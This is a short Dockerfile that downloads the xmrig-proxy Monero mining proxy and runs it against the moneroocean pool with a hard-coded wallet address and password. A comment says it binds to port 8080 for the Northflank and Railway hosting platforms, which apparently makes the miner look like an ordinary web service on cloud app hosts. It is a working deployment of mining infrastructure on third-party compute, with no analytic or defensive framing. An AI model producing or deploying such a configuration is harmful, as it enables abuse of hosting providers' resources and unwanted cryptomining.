FROM ubuntu:22.04
RUN apt-get update && apt-get install -y wget tar
RUN wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.21.0/xmrig-proxy-6.21.0-linux-x64.tar.gz
RUN tar -xf xmrig-proxy-6.21.0-linux-x64.tar.gz
# Port 8080 is standard for Northflank/Railway
CMD ./xmrig-proxy-6.21.0/xmrig-proxy -o gulf.moneroocean.stream:10128 -u 89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM  -p MasterBoss --bind 0.0.0.0:8080
